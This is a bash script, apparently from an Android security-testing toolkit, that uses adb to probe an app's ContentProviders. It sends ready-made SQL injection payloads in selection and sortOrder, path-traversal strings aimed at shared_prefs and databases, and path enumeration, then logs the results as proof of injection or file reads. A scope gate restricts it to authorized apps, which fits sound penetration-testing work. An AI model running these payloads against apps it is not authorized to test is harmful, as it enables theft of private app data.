#!/usr/bin/env bash
# provider_probe.sh — ContentProvider battery on YOUR OWN device (authorized app).
# SQLi selections / sortOrder, path-traversal in openFile, call() dispatch.
#   provider_probe.sh <pkg> [authority ...]
# No authorities given -> taken from loot/<pkg>/manifest_analysis.json.
# Seed your own test data in the app first; proofs read YOUR data only.
set -uo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
GATE="$HERE/scripts/scope_gate.sh"
LOOT_BASE="${LOOT_BASE:-$PWD/loot}"
PKG="${1:-}"; shift || true
[ -z "$PKG" ] && { echo "usage: provider_probe.sh <pkg> [authority ...]"; exit 1; }
"$GATE" app "$PKG" >/dev/null 2>&1 || { echo "[ABORT] $PKG not authorized."; "$GATE" app "$PKG"; exit 1; }
command -v adb >/dev/null 2>&1 || { echo "[!] adb missing."; exit 1; }
adb devices | awk 'NR>1 && $2=="device"' | grep -q . || { echo "[!] no device attached."; exit 1; }

AUTHS=("$@")
if [ ${#AUTHS[@]} -eq 0 ]; then
  AJ="$LOOT_BASE/$PKG/manifest_analysis.json"
  [ -f "$AJ" ] || { echo "[!] no manifest_analysis.json — run static_recon.sh first, or pass authorities."; exit 1; }
  mapfile -t AUTHS < <(python3 - "$AJ" <<'PY'
import json,sys
d=json.load(open(sys.argv[1]))
for p in d.get("providers",[]):
    for a in (p.get("authorities") or "").split(";"):
        a=a.strip()
        if a: print(a)
PY
)
fi
[ ${#AUTHS[@]} -eq 0 ] && { echo "[i] no provider authorities found."; exit 0; }

OUTD="$LOOT_BASE/$PKG/fuzz"; mkdir -p "$OUTD"; LOG="$OUTD/provider_probe.log"; : > "$LOG"
q(){ # q <uri> [extra content-args...]
  local uri="$1"; shift
  echo "== content query --uri '$uri' $*" | tee -a "$LOG"
  timeout 10 adb shell content query --uri "$uri" "$@" 2>&1 | head -15 | tee -a "$LOG"
}
TRAV=( "../shared_prefs/" "..%2fshared_prefs%2f" "%2e%2e%2f" "....//databases/" "..%252f" "/data/data/$PKG/shared_prefs/" )
SQLI=( "' OR '1'='1" "1' OR 1=1--" "' UNION SELECT sqlite_version()--" )
SORTS=( "1" "(CASE WHEN 1=1 THEN name ELSE 1/0 END)" "random()" )

for a in "${AUTHS[@]}"; do
  echo "##### authority: $a" | tee -a "$LOG"
  for path in "" "/" "/data" "/files" "/file" "/download" "/external_files" "/root"; do
    q "content://$a$path"
  done
  # traversal against openFile-style providers (query may 200 or error — both informative)
  for t in "${TRAV[@]}"; do q "content://$a/${t}prefs.xml"; done
  # SQLi in selection
  for s in "${SQLI[@]}"; do q "content://$a/" --where "$s"; done
  # sortOrder injection (SQLite won't parameterize it)
  for s in "${SORTS[@]}"; do q "content://$a/" --sort "$s"; done
done
echo
echo "[done] log: $LOG"
echo "[i] 200-with-rows on injected where/sort = SQLi. File contents on traversal = file-read."
echo "[i] errors like 'no such table'/'syntax error' confirm injection reaches SQLite."
